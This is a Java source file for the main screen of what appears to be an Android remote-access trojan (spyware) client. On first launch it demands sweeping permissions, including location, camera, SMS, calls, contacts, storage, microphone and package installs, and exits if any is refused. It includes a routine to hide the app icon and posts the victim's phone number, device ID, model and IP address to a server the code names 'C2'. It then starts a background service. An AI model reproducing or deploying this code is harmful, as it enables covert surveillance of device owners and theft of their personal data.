package com.ot.grhq.client;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.Location;
import com.ot.grhq.client.functionality.Phone;
import com.ot.grhq.client.functionality.SMS;
import com.ot.grhq.client.functionality.Screenshot;
import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 200;
    private static String[] PERMISSIONS = {
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.REQUEST_INSTALL_PACKAGES
    };

    private SharedPreferences preferences;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        checkPermissions();

        if (isFirstTime()) {
            try {
                setClientID();
            } catch (JSONException e) {}
        }

//        hideApplicationIcon();
        startService(new Intent(this, MainService.class));
    }

    /**
     * Hide application icon on first startup
     */
    private void hideApplicationIcon() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    /**
     * Check if necessary permissions are granted
     * @return <c>true</c> if all are granted; false otherwise
     */
    private void checkPermissions() {
        for (String permission : PERMISSIONS) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED)
                    getPermission(permission);
            }
        }
    }

    /**
     * Request for permission
     */
    private void getPermission(String permission) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            requestPermissions(new String[] { permission }, PERMISSION_REQUEST_CODE);
    }

    /**
     * Check if this is the application first startup
     * @return true if first time; false otherwise
     */
    private boolean isFirstTime() {
        preferences = getApplicationContext().getSharedPreferences("data", Context.MODE_PRIVATE);
        int val = preferences.getInt("client_id", -1);

        if (val == -1)
            return true;

        return false;
    }

    /**
     * Get client ID from c2
     */
    private void setClientID() throws JSONException {
        String url = Utils.C2_SERVER + "/client";

        String formData = "phone=" + Utils.phoneNumber(getApplicationContext());
        formData += "&device_api=" + Utils.deviceAPI();
        formData += "&device_id=" + Utils.deviceID(getApplicationContext());
        formData += "&device_model=" + Utils.deviceModel();
        formData += "&ip_address=" + Utils.ipAddress();

        try {
            ClientID clientID = new ClientID(url, formData.toString(), result -> {
                if (result != null) {
                    int clientId = -1;
                    JSONObject response = new JSONObject(result);
                    clientId = response.getInt("client_id");

                    preferences = getApplicationContext().getSharedPreferences("data", Context.MODE_PRIVATE);
                    SharedPreferences.Editor editor =  preferences.edit();
                    editor.putInt("client_id", clientId);
                    editor.apply();
                }
            });

            clientID.execute();
        } catch (Exception e) {}
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED)
                finishAffinity();
        }
    }

    private static class ClientID extends AsyncTask<Void, Void, String> {

        private String postURL;
        private String formData;
        private PostDataListener listener;

        public ClientID(String postURL, String formData, PostDataListener listener) {
            this.postURL = postURL;
            this.formData = formData;
            this.listener = listener;
        }

        public interface PostDataListener {
            void onDataPosted(String result) throws JSONException;
        }

        @Override
        protected String doInBackground(Void... voids) {
            HttpURLConnection urlConnection = null;

            try {
                URL url = new URL(postURL);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                urlConnection.setRequestProperty("Accept", "*/*");
                urlConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
                urlConnection.setDoOutput(true);

                OutputStream outputStream = urlConnection.getOutputStream();
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
                writer.write(formData);
                writer.flush();
                writer.close();
                outputStream.close();

                // 6. Read the response from the server
                BufferedReader reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                // 7. Handle JSON response
                String jsonResponse = response.toString();
                return jsonResponse;
            } catch (IOException e) {
            }

            return null;
        }

        @Override
        protected void onPostExecute(String result) {
            if (listener != null) {
                try {
                    listener.onDataPosted(result);
                } catch (JSONException e) {}
            }
        }
    }
}